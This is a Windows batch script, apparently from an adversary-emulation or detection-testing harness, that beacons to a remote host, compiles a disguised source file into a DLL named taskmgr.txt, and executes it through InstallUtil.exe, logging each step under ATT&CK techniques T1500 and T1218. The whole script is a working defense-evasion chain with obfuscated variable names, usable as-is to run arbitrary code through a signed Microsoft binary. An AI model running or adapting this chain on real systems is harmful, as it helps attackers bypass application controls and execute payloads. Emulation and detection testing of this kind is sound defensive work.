@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET recnn=%APPDATA%\9318\44cd611a
SET detcfkn=https://10.0.0.49
SET uouoq=https://10.0.0.49/stage/2/icon.png?9318-10
SET lqyereup=ITZEL-S2BS
SET ufeybybm=10
SET hpnjatpj=taskmgr.txt
SET njozco=file.txt
SET kkjwr=9318
SET yxtnl=%APPDATA%\%ufeybybm%\macula-simulations.log

echo [!DATE! !TIME!][DEBUG][!lqyereup!]: heartbeat_start=!uouoq!>> "!yxtnl!" 2>nul
curl -k -s -o nul "!uouoq!"
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: heartbeat_complete=!errorlevel!>> "!yxtnl!" 2>nul

echo [!DATE! !TIME!][DEBUG][!lqyereup!]: chdir_start=!recnn!>> "!yxtnl!" 2>nul
cd /d "!recnn!" 2>nul
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: chdir_complete=!errorlevel!>> "!yxtnl!" 2>nul

SET vzqdc=1
SET fffhc=
SET vcsu=0
SET okhz=0

echo [!DATE! !TIME!][DEBUG][!lqyereup!]: compile_start=!njozco!>> "!yxtnl!" 2>nul
%SystemRoot%\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:library /reference:System.Configuration.Install.dll "!njozco!" /out:"!hpnjatpj!" 2>&1 >nul
SET okhz=!errorlevel!
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: compile_complete=!okhz!>> "!yxtnl!" 2>nul
IF !okhz! EQU 0 (SET vzqdc=1) ELSE (SET vzqdc=0&SET fffhc=compile_failed)
echo [!DATE! !TIME!][!lqyereup!]: !ufeybybm!-!kkjwr!-T1500|Compile After Delivery=!vzqdc!:!fffhc!>> "!yxtnl!" 2>nul

echo [!DATE! !TIME!][DEBUG][!lqyereup!]: execution_start=!hpnjatpj!>> "!yxtnl!" 2>nul
%SystemRoot%\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U "!hpnjatpj!" 2>&1 >nul
SET vcsu=!errorlevel!
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: execution_complete=!vcsu!>> "!yxtnl!" 2>nul
IF !vcsu! EQU 0 (SET vzqdc=1) ELSE (SET vzqdc=0&SET fffhc=execution_failed_!vcsu!)
echo [!DATE! !TIME!][!lqyereup!]: !ufeybybm!-!kkjwr!-T1218|Signed Binary Proxy Execution=!vzqdc!:!fffhc!>> "!yxtnl!" 2>nul